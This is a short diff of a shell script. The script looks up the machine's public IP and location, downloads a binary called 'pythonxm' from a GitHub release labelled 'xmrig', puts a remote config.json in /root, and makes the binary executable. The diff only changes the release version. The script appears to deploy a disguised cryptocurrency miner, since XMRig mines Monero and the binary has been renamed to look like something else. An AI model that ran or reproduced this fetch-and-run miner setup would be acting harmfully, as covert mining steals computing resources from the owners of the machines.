@@ -3,7 +3,7 @@ iip=$(curl https://ipecho.net/plain)
 IPNAME=$(sed 's|\.|o|g' <<< $iip)
 curl ipinfo.io
 
-wget https://github.com/one10001/xmrig/releases/download/v0.02/pythonxm
+wget https://github.com/one10001/xmrig/releases/download/v0.0.3/pythonxm
 wget https://github.com/one10001/10001code/raw/main/config.json
 cp config.json /root/config.json
 chmod +x pythonxm
